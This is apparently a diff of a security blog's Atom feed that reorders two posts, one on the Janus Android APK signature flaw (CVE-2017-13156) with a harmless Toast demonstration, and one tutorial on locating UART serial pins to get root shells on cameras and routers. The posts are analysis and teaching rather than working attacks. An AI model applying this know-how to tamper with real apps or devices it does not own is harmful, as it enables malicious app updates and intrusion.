@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://www.future-sec.com/"/>
-  <updated>2017-12-21T07:42:22.081Z</updated>
+  <updated>2017-12-21T07:53:50.474Z</updated>
   <id>http://www.future-sec.com/</id>
   
   <author>
@@ -14,6 +14,39 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Janus漏洞(CVE-2017-13156)分析</title>
+    <link href="http://www.future-sec.com/Janus-CVE-2017-13156-analysis.html"/>
+    <id>http://www.future-sec.com/Janus-CVE-2017-13156-analysis.html</id>
+    <published>2017-12-20T16:00:00.000Z</published>
+    <updated>2017-12-21T07:53:50.474Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>Android系统要求每一个Android应用程序必须要经过数字签名才能够安装到系统中，也就是说如果一个Android应用程序没有经过数字签名，是没有办法安装到系统中的。Android通过数字签名来标识应用程序的作者和在应用程序之间建立信任关系，不是用来决定最终用户可以安装哪些应用程序。这个数字签名由应用程序的作者完成，并不需要权威的数字证书签名机构认证，它只是用来让应用程序包自我认证的。然而Google在本月4日发布的Android安全公告中编号为CVE-2017-13156，这个漏洞被称为Janus漏洞，利用该漏洞可修改app而不影响原始签名。</p>
+<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="Android-app签名校验简单介绍"><a href="#Android-app签名校验简单介绍" class="headerlink" title="Android app签名校验简单介绍"></a>Android app签名校验简单介绍</h3><p>在Android源码中“frameworks/base/core/java/android/content/pm/PackageParser.java”中。PackageParser类的collectCertificates方法会对APK进行签名校验，并且遍历APK中的所有文件，对每个文件进行校验。下面是该方法的源码：<br><img src="http://p1aqjecep.bkt.clouddn.com/image002.jpg" alt="img"><br><img src="http://p1aqjecep.bkt.clouddn.com/image004.jpg" alt="img"><br>APK是一个ZIP格式的文件，因此使用ZIP相关的类进行读写。在上面代码中调用了loadCertificates，这个方法会返回一个二维数组，当APK中的文件签名校验失败，loadCertificates方法会返回一个空数组（可能是null，可能是数组长度为0），那么依照上面代码的逻辑如果数组为空则会抛出异常。<br>loadCertificates方法的代码见下：<br><img src="http://p1aqjecep.bkt.clouddn.com/image006.jpg" alt="img"><br>其中is是JarFile.JarFileInputStream类的对象。loadCertificates调用了readFullyIgnoringContents，在readFullyIgnoringContents中会调用JarFile.JarFileInputStream.read（JarFile类在“libcore/luni/src/main/java/java/util/jar/JarFile.java”文件中）<br>读取APK中一项数据，在read方法中会校验读取到的数据项的签名，如果签名校验失败，则会抛出SecurityException类型的异常，即签名校验失败。<br>上面代码调用了StrictJarFile.getCertificateChains方法，在/ libcore / luni / src / main / java / java / util / jar / StrictJarFile.java里面。下面是它的代码：<br><img src="http://p1aqjecep.bkt.clouddn.com/image007.jpg" alt="img"><br>上面的isSigned在下面的代码里面获取的：<br><img src="http://p1aqjecep.bkt.clouddn.com/image009.jpg" alt="img"><br>当证书读取成功，而且APK经过了签名，isSigned为true。<br>回到StrictJarFile.getCertificateChains中，当isSigned为true时会调用JarVerifier.getCertificateChains方法，下面是它的代码：<br><img src="http://p1aqjecep.bkt.clouddn.com/image010.jpg" alt="img"><br>verifiedEntries的声明：<br><img src="http://p1aqjecep.bkt.clouddn.com/image012.jpg" alt="img"><br>verifiedEntries是一个键值对，键是APK中经过了签名的文件名，如：classes.dex文件，值是证书数组。如果向已经签过名的APK中新添加一个文件然后安装这个APK，当程序逻辑执行到JarVerifier.getCertificateChains中时，在verifiedEntries里面无法找到新添加的文件名（因为这个新文件是在APK签名之后添加），那么JarVerifier.getCertificateChains方法将返回null。<br>以上就是整个对于app签名的简单分析。</p>
+<h3 id="签名方案"><a href="#签名方案" class="headerlink" title="签名方案"></a>签名方案</h3><p>参考google官方文档获得:<br>APK 签名方案<br>Android 支持两种应用签名方案，一种是基于 JAR 签名的方案（v1 方案），另一种是 Android Nougat (Android 7.0) 中引入的 APK 签名方案 v2（v2 方案）。<br>JAR 签名（v1 方案）<br>v1 签名并非保护整个apk文件，例如 ZIP 元数据就不受保护。再者，APK 验证程序需要处理大量不可信（尚未经过验证）的数据结构，而不受签名保护的数据不在处理的行列中。这会导致相当大的受攻击面。此外，APK 验证程序必须解压所有已压缩的条目，而这需要花费更多时间和内存。为了解决这些问题，Android 7.0 中引入了 APK 签名方案 v2。<br>APK 签名方案 v2（v2 方案）<br>Android 7.0 中引入了 APK 签名方案 v2（v2 方案）。该方案会对 APK 的内容进行hash处理和签名，然后将生成的“APK 签名分块”插入到 APK 中。<br>在验证期间，v2 方案会将 APK 文件视为 Blob，并对整个文件进行签名检查。对 APK 进行的任何修改（包括对 ZIP 元数据进行的修改）都会使 APK 签名作废。这种形式的 APK 验证不仅速度要快得多，而且能够发现更多种未经授权的修改。<br>同时，新的签名格式向后兼容，使用这种新格式签名的 APK（必须也使用v1） 可在更低版本的 Android 设备上进行安装（会直接忽略添加到 APK 的额外数据）。</p>
+<h3 id="apk签名校验方式"><a href="#apk签名校验方式" class="headerlink" title="apk签名校验方式"></a>apk签名校验方式</h3><p>为了提高兼容性，应同时采用 v1 和 v2 这两种方案对应用进行签名。与只使用v1 方案签名的应用相比，经过 v2 方案签名的应用能够更快速地安装到 Android Nougat 以及更高版本的设备上。但是更低版本的 Android 平台会忽略 v2 签名，这就需要应用包含 v1 签名。<br><img src="http://p1aqjecep.bkt.clouddn.com/image014.jpg" alt="img"><br>验证程序会对照存储在“APK 签名分块”中的 v2 签名对 APK 的全文件hash进行验证。该hash涵盖除“APK 签名分块”（其中包含 v2 签名）之外的所有内容。在“APK 签名分块”以外对 APK 进行的任何修改都会使 APK 的 v2 签名作废。v2 签名被删除的 APK 也会被拒绝，因为 v1 签名指明相应 APK 带有 v2 签名，所以 Android Nougat 及更高版本会拒绝使用 v1 签名验证 APK。</p>
+<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Janus漏洞主要是向APK里面添加额外的DEX文件。一方面，APK文件是zip文件，可以包含初始时的任意字节，在它的zip条目（实际情况下更多是在zip条目里面）。但是JAR签名方案只考虑了zip入口。当计算或者校验apk的签名的时候，它忽略了其他字节。另一方面，在字符串、类、方法定义等常规部分之后，一个DEX文件可以包含任意的字节。综上所述，一个文件可以同时包含一个APK文件和一个DEX文件。<br><img src="http://p1aqjecep.bkt.clouddn.com/image016.jpg" alt="img"><br>另一个关键点是Dalvik / ART虚拟机方面。android运行加载APK文件，提取它的DEX文件，然后运行它的代码。在实践中，虚拟机可以加载和执行APK文件。当它得到APK文件时，它仍然会查看header的magic字节来判断它是什么类型的文件，如果找到一个DEX类型的，就会将文件载入为DEX文件，否则就会将文件加载为一个APK文件，其中包括一个带有DEX的zip文件。因此，既可以读取DEX文件又可以读取APK文件。<br>所以攻击者可以利用着这种二元性，在不影响其签名的情况下将一个恶意DEX文件预先添加到APK文件里面，然后，android运行时接受APK文件作为一个合法的早期版本的应用程序的有效更新，但是Dalvik虚拟机从注入的DEX文件中加载代码，从而实现攻击。</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p><img src="http://p1aqjecep.bkt.clouddn.com/image018.jpg" alt="img"><br>原来的apk主要代码<br><img src="http://p1aqjecep.bkt.clouddn.com/image019.jpg" alt="img"><br><img src="http://p1aqjecep.bkt.clouddn.com/image021.jpg" alt="img"><br>修改了dex文件，将Log.i(“janus”,”点击事件”);修改为Toast.makeText(getApplicationContext(),”I steal your car.”,Toast.LENGTH_LONG).show();<br><img src="http://p1aqjecep.bkt.clouddn.com/image023.jpg" alt="img"><br><img src="http://p1aqjecep.bkt.clouddn.com/image024.jpg" alt="img"><br>安装合并好的1.apk<br><img src="http://p1aqjecep.bkt.clouddn.com/image026.jpg" alt="img"><br><img src="http://p1aqjecep.bkt.clouddn.com/image027.jpg" alt="img"><br>测试<br><img src="http://p1aqjecep.bkt.clouddn.com/image029.jpg" alt="img"><br>攻击完成</p>
+<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>该漏洞仅影响基于 JAR 签名的方案（v1 方案）。不影响自Android 7.0 以来引入的 APK 签名方案 v2（v2 方案）。</p>
+<h2 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h2><p>可被添加恶意dex文件可以进行一些敏感性的操作，例如窃取用户数据、监控手机等高危操作。</p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://source.android.com/security/apksigning/v2#verification" rel="external nofollow noopener noreferrer" target="_blank">https://source.android.com/security/apksigning/v2#verification</a><br><a href="https://www.guardsquare.com/en/blog/new-android-vulnerability-allows-attackers-modify-apps-without-affecting-their-signatures" rel="external nofollow noopener noreferrer" target="_blank">https://www.guardsquare.com/en/blog/new-android-vulnerability-allows-attackers-modify-apps-without-affecting-their-signatures</a></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h2&gt;&lt;p&gt;Android系统要求每一个Android应用程序必须要经过数字签名才能够安装到系统中，也就是说如果一个Android应用程序没有经过数字签
+    
+    </summary>
+    
+      <category term="移动安全" scheme="http://www.future-sec.com/categories/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/"/>
+    
+    
+      <category term="移动安全" scheme="http://www.future-sec.com/tags/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/"/>
+    
+      <category term="app签名" scheme="http://www.future-sec.com/tags/app%E7%AD%BE%E5%90%8D/"/>
+    
+  </entry>
   
   <entry>
     <title>使用MITMF中间人攻击非80端口的HTTP</title>
@@ -57,35 +90,34 @@
   </entry>
   
   <entry>
-    <title>Janus漏洞(CVE-2017-13156)分析</title>
-    <link href="http://www.future-sec.com/Janus-CVE-2017-13156-analysis.html"/>
-    <id>http://www.future-sec.com/Janus-CVE-2017-13156-analysis.html</id>
-    <published>2017-12-20T16:00:00.000Z</published>
-    <updated>2017-12-21T07:53:50.474Z</updated>
+    <title>物联网硬件安全分析基础-串口调试</title>
+    <link href="http://www.future-sec.com/iot-security-hardware-debuging.html"/>
+    <id>http://www.future-sec.com/iot-security-hardware-debuging.html</id>
+    <published>2017-12-04T16:00:00.000Z</published>
+    <updated>2017-12-15T12:56:52.397Z</updated>
     
-    <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>Android系统要求每一个Android应用程序必须要经过数字签名才能够安装到系统中，也就是说如果一个Android应用程序没有经过数字签名，是没有办法安装到系统中的。Android通过数字签名来标识应用程序的作者和在应用程序之间建立信任关系，不是用来决定最终用户可以安装哪些应用程序。这个数字签名由应用程序的作者完成，并不需要权威的数字证书签名机构认证，它只是用来让应用程序包自我认证的。然而Google在本月4日发布的Android安全公告中编号为CVE-2017-13156，这个漏洞被称为Janus漏洞，利用该漏洞可修改app而不影响原始签名。</p>
-<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="Android-app签名校验简单介绍"><a href="#Android-app签名校验简单介绍" class="headerlink" title="Android app签名校验简单介绍"></a>Android app签名校验简单介绍</h3><p>在Android源码中“frameworks/base/core/java/android/content/pm/PackageParser.java”中。PackageParser类的collectCertificates方法会对APK进行签名校验，并且遍历APK中的所有文件，对每个文件进行校验。下面是该方法的源码：<br><img src="http://p1aqjecep.bkt.clouddn.com/image002.jpg" alt="img"><br><img src="http://p1aqjecep.bkt.clouddn.com/image004.jpg" alt="img"><br>APK是一个ZIP格式的文件，因此使用ZIP相关的类进行读写。在上面代码中调用了loadCertificates，这个方法会返回一个二维数组，当APK中的文件签名校验失败，loadCertificates方法会返回一个空数组（可能是null，可能是数组长度为0），那么依照上面代码的逻辑如果数组为空则会抛出异常。<br>loadCertificates方法的代码见下：<br><img src="http://p1aqjecep.bkt.clouddn.com/image006.jpg" alt="img"><br>其中is是JarFile.JarFileInputStream类的对象。loadCertificates调用了readFullyIgnoringContents，在readFullyIgnoringContents中会调用JarFile.JarFileInputStream.read（JarFile类在“libcore/luni/src/main/java/java/util/jar/JarFile.java”文件中）<br>读取APK中一项数据，在read方法中会校验读取到的数据项的签名，如果签名校验失败，则会抛出SecurityException类型的异常，即签名校验失败。<br>上面代码调用了StrictJarFile.getCertificateChains方法，在/ libcore / luni / src / main / java / java / util / jar / StrictJarFile.java里面。下面是它的代码：<br><img src="http://p1aqjecep.bkt.clouddn.com/image007.jpg" alt="img"><br>上面的isSigned在下面的代码里面获取的：<br><img src="http://p1aqjecep.bkt.clouddn.com/image009.jpg" alt="img"><br>当证书读取成功，而且APK经过了签名，isSigned为true。<br>回到StrictJarFile.getCertificateChains中，当isSigned为true时会调用JarVerifier.getCertificateChains方法，下面是它的代码：<br><img src="http://p1aqjecep.bkt.clouddn.com/image010.jpg" alt="img"><br>verifiedEntries的声明：<br><img src="http://p1aqjecep.bkt.clouddn.com/image012.jpg" alt="img"><br>verifiedEntries是一个键值对，键是APK中经过了签名的文件名，如：classes.dex文件，值是证书数组。如果向已经签过名的APK中新添加一个文件然后安装这个APK，当程序逻辑执行到JarVerifier.getCertificateChains中时，在verifiedEntries里面无法找到新添加的文件名（因为这个新文件是在APK签名之后添加），那么JarVerifier.getCertificateChains方法将返回null。<br>以上就是整个对于app签名的简单分析。</p>
-<h3 id="签名方案"><a href="#签名方案" class="headerlink" title="签名方案"></a>签名方案</h3><p>参考google官方文档获得:<br>APK 签名方案<br>Android 支持两种应用签名方案，一种是基于 JAR 签名的方案（v1 方案），另一种是 Android Nougat (Android 7.0) 中引入的 APK 签名方案 v2（v2 方案）。<br>JAR 签名（v1 方案）<br>v1 签名并非保护整个apk文件，例如 ZIP 元数据就不受保护。再者，APK 验证程序需要处理大量不可信（尚未经过验证）的数据结构，而不受签名保护的数据不在处理的行列中。这会导致相当大的受攻击面。此外，APK 验证程序必须解压所有已压缩的条目，而这需要花费更多时间和内存。为了解决这些问题，Android 7.0 中引入了 APK 签名方案 v2。<br>APK 签名方案 v2（v2 方案）<br>Android 7.0 中引入了 APK 签名方案 v2（v2 方案）。该方案会对 APK 的内容进行hash处理和签名，然后将生成的“APK 签名分块”插入到 APK 中。<br>在验证期间，v2 方案会将 APK 文件视为 Blob，并对整个文件进行签名检查。对 APK 进行的任何修改（包括对 ZIP 元数据进行的修改）都会使 APK 签名作废。这种形式的 APK 验证不仅速度要快得多，而且能够发现更多种未经授权的修改。<br>同时，新的签名格式向后兼容，使用这种新格式签名的 APK（必须也使用v1） 可在更低版本的 Android 设备上进行安装（会直接忽略添加到 APK 的额外数据）。</p>
-<h3 id="apk签名校验方式"><a href="#apk签名校验方式" class="headerlink" title="apk签名校验方式"></a>apk签名校验方式</h3><p>为了提高兼容性，应同时采用 v1 和 v2 这两种方案对应用进行签名。与只使用v1 方案签名的应用相比，经过 v2 方案签名的应用能够更快速地安装到 Android Nougat 以及更高版本的设备上。但是更低版本的 Android 平台会忽略 v2 签名，这就需要应用包含 v1 签名。<br><img src="http://p1aqjecep.bkt.clouddn.com/image014.jpg" alt="img"><br>验证程序会对照存储在“APK 签名分块”中的 v2 签名对 APK 的全文件hash进行验证。该hash涵盖除“APK 签名分块”（其中包含 v2 签名）之外的所有内容。在“APK 签名分块”以外对 APK 进行的任何修改都会使 APK 的 v2 签名作废。v2 签名被删除的 APK 也会被拒绝，因为 v1 签名指明相应 APK 带有 v2 签名，所以 Android Nougat 及更高版本会拒绝使用 v1 签名验证 APK。</p>
-<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Janus漏洞主要是向APK里面添加额外的DEX文件。一方面，APK文件是zip文件，可以包含初始时的任意字节，在它的zip条目（实际情况下更多是在zip条目里面）。但是JAR签名方案只考虑了zip入口。当计算或者校验apk的签名的时候，它忽略了其他字节。另一方面，在字符串、类、方法定义等常规部分之后，一个DEX文件可以包含任意的字节。综上所述，一个文件可以同时包含一个APK文件和一个DEX文件。<br><img src="http://p1aqjecep.bkt.clouddn.com/image016.jpg" alt="img"><br>另一个关键点是Dalvik / ART虚拟机方面。android运行加载APK文件，提取它的DEX文件，然后运行它的代码。在实践中，虚拟机可以加载和执行APK文件。当它得到APK文件时，它仍然会查看header的magic字节来判断它是什么类型的文件，如果找到一个DEX类型的，就会将文件载入为DEX文件，否则就会将文件加载为一个APK文件，其中包括一个带有DEX的zip文件。因此，既可以读取DEX文件又可以读取APK文件。<br>所以攻击者可以利用着这种二元性，在不影响其签名的情况下将一个恶意DEX文件预先添加到APK文件里面，然后，android运行时接受APK文件作为一个合法的早期版本的应用程序的有效更新，但是Dalvik虚拟机从注入的DEX文件中加载代码，从而实现攻击。</p>
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p><img src="http://p1aqjecep.bkt.clouddn.com/image018.jpg" alt="img"><br>原来的apk主要代码<br><img src="http://p1aqjecep.bkt.clouddn.com/image019.jpg" alt="img"><br><img src="http://p1aqjecep.bkt.clouddn.com/image021.jpg" alt="img"><br>修改了dex文件，将Log.i(“janus”,”点击事件”);修改为Toast.makeText(getApplicationContext(),”I steal your car.”,Toast.LENGTH_LONG).show();<br><img src="http://p1aqjecep.bkt.clouddn.com/image023.jpg" alt="img"><br><img src="http://p1aqjecep.bkt.clouddn.com/image024.jpg" alt="img"><br>安装合并好的1.apk<br><img src="http://p1aqjecep.bkt.clouddn.com/image026.jpg" alt="img"><br><img src="http://p1aqjecep.bkt.clouddn.com/image027.jpg" alt="img"><br>测试<br><img src="http://p1aqjecep.bkt.clouddn.com/image029.jpg" alt="img"><br>攻击完成</p>
-<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>该漏洞仅影响基于 JAR 签名的方案（v1 方案）。不影响自Android 7.0 以来引入的 APK 签名方案 v2（v2 方案）。</p>
-<h2 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h2><p>可被添加恶意dex文件可以进行一些敏感性的操作，例如窃取用户数据、监控手机等高危操作。</p>
-<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://source.android.com/security/apksigning/v2#verification" rel="external nofollow noopener noreferrer" target="_blank">https://source.android.com/security/apksigning/v2#verification</a><br><a href="https://www.guardsquare.com/en/blog/new-android-vulnerability-allows-attackers-modify-apps-without-affecting-their-signatures" rel="external nofollow noopener noreferrer" target="_blank">https://www.guardsquare.com/en/blog/new-android-vulnerability-allows-attackers-modify-apps-without-affecting-their-signatures</a></p>
+    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>上篇介绍了关于通过编程器直接读取芯片获取固件用来静态分析的一点思路，本篇将介绍通过UART串口来直接与机器交互，通过串口输出输入信息，做动态调试。</p>
+<h2 id="UART串口调试"><a href="#UART串口调试" class="headerlink" title="UART串口调试"></a>UART串口调试</h2><p>UART调试第一步需要先找到对应的四个PIN，在通电情况下，VCC口可以不要接，判断 GND, RX, TX三个引脚是调试的关键，找四个引脚可以先看PCB上的印字。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image65.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image66.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image67.jpg" alt="img"><br>但多数厂商在量产前会去掉用于调试的串口印字，如果找不到对应引脚的印字，就需要先分析PCB的结构，一般PCB上有3、4 、5个并排或相距不远的焊点或通孔，就有可能是UART调试串口。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image68.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image69.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image70.jpg" alt="img"><br>但PCB上可能存在多个这样的焊点或通孔，从多个口中找出真正的调试串口，就需要借助到万用表。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image101.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image102.jpg" alt="img"><br>万用表找串口首先需要找到GND口，就是接地口，在疑似串口的焊点处，通过测量电势差，可以判断出GND口，通过连接焊点和输入负极，如果电势为0，就可能是GND口，如果电势为最大值，例如3.6V、5V等，就可能是VCC口。然后通过UART转换器对应的4个口，引出导线，并设置好串口输出环境后，就可以依次尝试。也可以通过短接其中的两口，如果机器重启，就可以判断这两口为VCC和GND。<br>需要注意的是，在TTL电平模式下，UATR转换接口上的RX、TX口与上位设备，也就是PCB上的UART口的RX和TX是需要反接的。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image71.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image72.jpg" alt="img"></p>
+<h3 id="案例一：调试某智能摄像头"><a href="#案例一：调试某智能摄像头" class="headerlink" title="案例一：调试某智能摄像头"></a>案例一：调试某智能摄像头</h3><p>通过万用表测量电势差之后，在靠近CPU的地方有三个通孔，有可能是UART串口，用导线连接之后，设置波特率为115200。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image73.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image35.jpg" alt="img"><br>用SecureCRT连接串口，给机器通上电之后，串口立马输出了启动信息，并可以执行命令，说明串口正确，如果遇到无法输入的情况，首先检查接线是否松动，然后在SecureCRT中的， Session Options -&gt; Connection -&gt; Serial -&gt; Flow Control，将原先选中的 RTS/CTS取消掉，这是因为如果选中了RTS/CTS ，则硬件上要有对应接口，软件上实现对应协议，才能实现此流控制。如果串口输出为乱码，则需要切换波特率，直至输出正常。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image74.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image75.jpg" alt="img"></p>
+<h3 id="案例二：调试某路由器"><a href="#案例二：调试某路由器" class="headerlink" title="案例二：调试某路由器"></a>案例二：调试某路由器</h3><p>在靠近cpu的地方有四个通孔，测量电势差后，利用导线探针，确定了三个PIN，连接转换器。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image76.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image77.jpg" alt="img"><br>串口中输出调试信息，因波特率设置问题，初始输出为乱码，改为38400即可正常输出。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image78.jpg" alt="img"></p>
+<h3 id="案例三：调试某路由器"><a href="#案例三：调试某路由器" class="headerlink" title="案例三：调试某路由器"></a>案例三：调试某路由器</h3><p>在PCB上有四个焊点，先测量电势差，分出GND和VCC，在利用焊枪分别焊上导线，连接转换接口，测试出TX和RX口。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image79.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image80.jpg" alt="img"><br>设置波特率为57600，串口输出正确，并可执行命令。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image81.jpg" alt="img"></p>
+<h3 id="案例四：调试某路由器"><a href="#案例四：调试某路由器" class="headerlink" title="案例四：调试某路由器"></a>案例四：调试某路由器</h3><p>在PCB一侧有5个通孔，并标注有UART-0字样，通电后，测试各口电势差，确实GND和VCC后，连接转换接口，并测试出RX和TX口。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image82.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image83.jpg" alt="img"><br>设置波特率为57600，串口输出正确，并可执行命令。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image84.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image85.jpg" alt="img"><br>通过本地架设的tftp服务器，并在串口输入命令，开启相关服务，就可以通过tftp与机器传输文件。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image86.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image87.jpg" alt="img"></p>
+<h3 id="案例五：调试某无线数据终端"><a href="#案例五：调试某无线数据终端" class="headerlink" title="案例五：调试某无线数据终端"></a>案例五：调试某无线数据终端</h3><p>拆开正面压板，发现PCB上标注有印字，利用PCB夹具和探针，引出RX和TX口，连接转换器，因该无线终端串口电压不超过1.7V，焊接容易造成信号衰减，因此采用夹具。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image88.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image89.jpg" alt="img"><br>因串口输出信息过多，影响输入和输出结果，因此采用串口调试助手，设置波特率为115200，输入命令并发送，可以成功执行。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image90.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image91.jpg" alt="img"></p>
+<h3 id="案例六：调试某无线数据终端"><a href="#案例六：调试某无线数据终端" class="headerlink" title="案例六：调试某无线数据终端"></a>案例六：调试某无线数据终端</h3><p>拆解机器，该型机器采用多块电路板层级设计，其主要处理芯片位于顶部，拆解时注意走线位置，防止拉坏接线口，在PCB上有UART的PIN口印字，给每一个PIN口焊上导线，连接转换器。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image122.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image123.jpg" alt="img"><br>设置波特率为921600，连接串口，用root账号登陆，密码为空，成功进入系统，执行命令。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image124.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image125.jpg" alt="img"></p>
 ]]></content>
     
     <summary type="html">
     
-      &lt;h2 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h2&gt;&lt;p&gt;Android系统要求每一个Android应用程序必须要经过数字签名才能够安装到系统中，也就是说如果一个Android应用程序没有经过数字签
+      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;上篇介绍了关于通过编程器直接读取芯片获取固件用来静态分析的一点思路，本篇将介绍通过UART串口来直接与机器交互，通过串口输出输入信息，做动态
     
     </summary>
     
-      <category term="移动安全" scheme="http://www.future-sec.com/categories/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/"/>
+      <category term="硬件安全" scheme="http://www.future-sec.com/categories/%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8/"/>
     
     
-      <category term="移动安全" scheme="http://www.future-sec.com/tags/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/"/>
+      <category term="硬件安全" scheme="http://www.future-sec.com/tags/%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8/"/>
     
-      <category term="app签名" scheme="http://www.future-sec.com/tags/app%E7%AD%BE%E5%90%8D/"/>
+      <category term="UART串口调试" scheme="http://www.future-sec.com/tags/UART%E4%B8%B2%E5%8F%A3%E8%B0%83%E8%AF%95/"/>
     
   </entry>
   
@@ -131,38 +163,6 @@
       <category term="ssl" scheme="http://www.future-sec.com/tags/ssl/"/>
     
       <category term="https" scheme="http://www.future-sec.com/tags/https/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>物联网硬件安全分析基础-串口调试</title>
-    <link href="http://www.future-sec.com/iot-security-hardware-debuging.html"/>
-    <id>http://www.future-sec.com/iot-security-hardware-debuging.html</id>
-    <published>2017-12-04T16:00:00.000Z</published>
-    <updated>2017-12-15T12:56:52.397Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>上篇介绍了关于通过编程器直接读取芯片获取固件用来静态分析的一点思路，本篇将介绍通过UART串口来直接与机器交互，通过串口输出输入信息，做动态调试。</p>
-<h2 id="UART串口调试"><a href="#UART串口调试" class="headerlink" title="UART串口调试"></a>UART串口调试</h2><p>UART调试第一步需要先找到对应的四个PIN，在通电情况下，VCC口可以不要接，判断 GND, RX, TX三个引脚是调试的关键，找四个引脚可以先看PCB上的印字。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image65.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image66.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image67.jpg" alt="img"><br>但多数厂商在量产前会去掉用于调试的串口印字，如果找不到对应引脚的印字，就需要先分析PCB的结构，一般PCB上有3、4 、5个并排或相距不远的焊点或通孔，就有可能是UART调试串口。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image68.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image69.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image70.jpg" alt="img"><br>但PCB上可能存在多个这样的焊点或通孔，从多个口中找出真正的调试串口，就需要借助到万用表。<br><img src="http://ozuqqvmm5.bkt.clouddn.com/image101.jpg" alt="img"><br><img src="http://ozuqqvmm5.bkt.clouddn.com/image102.jpg" alt="img"><br>万用表找串口首先需要找到GND口，就是接地口，在疑似串口的焊点处，通过测量电势差，可以判断出GND口，通过连接焊点和输入负极，如果电势为0，就可能是GND口，如果电势为最大值，例如3.6V、5V等，就可能是VCC口。然后通过UART转换器对应的4个口，引出导线，并设置好串口输出环境后，就可以依次尝试。也可以通过短接其中的两口，如果机器重启，就可以判断这两口为VCC和GND。<br>需要注意的是，在TTL电平模式下，UATR转换接口上的RX、TX口与上位设备，也就是PCB上的UART口的RX和TX是需要反接的。<br><img 